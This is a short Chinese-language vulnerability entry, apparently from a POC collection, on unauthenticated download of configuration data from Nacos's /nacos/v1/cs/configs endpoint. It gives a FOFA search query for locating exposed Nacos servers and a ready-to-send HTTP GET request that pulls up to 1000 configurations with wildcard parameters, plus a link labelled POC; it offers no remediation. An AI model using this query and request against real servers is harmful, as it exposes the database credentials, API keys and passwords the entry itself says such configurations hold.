## Nacos-configs接口存在未授权下载配置信息漏洞

## 一、漏洞简介
Nacos 是阿里巴巴推出来的一个开源项目，是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。致力于帮助发现、配置和管理微服务。Nacos 提供了一组简单易用的特性集，可以快速实现动态服务发现、服务配置、服务元数据及流量管理。攻击者若能直接访问Nacos的/nacos/v1/cs/configs接口，且系统未正确配置鉴权机制，可绕过认证直接下载配置文件。配置文件中可能包含敏感信息，如数据库连接串、API密钥、账号密码等，一旦泄露将导致严重安全风险。

## fofa
```
(app="Nacos") && icon_hash="13942501"
```

## POC
```
GET /nacos/v1/cs/configs?dataId=*&group=*&appName=&config_tags=&pageNo=1&pageSize=1000&tenant=*&search=blur HTTP/1.1Host: your-ipUser-Agent: Mozilla/5.0 (Windows NT 10.0;Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116Safari/537.36Accept-Encoding: gzip, deflateAccept: */*Connection: closeAccept-Charset: utf-8
```

## POC
```
https://mp.weixin.qq.com/s/VTyQIlfrVT11yCU52nOcrA
```
